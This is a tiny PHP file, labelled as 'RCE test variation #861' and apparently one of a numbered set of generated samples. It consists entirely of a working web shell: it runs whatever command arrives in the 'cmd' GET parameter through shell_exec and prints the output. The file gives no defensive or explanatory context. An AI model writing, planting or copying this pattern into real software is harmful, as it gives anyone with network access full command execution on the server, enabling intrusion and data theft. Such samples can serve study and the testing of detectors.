<?php
// RCE test variation #861
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>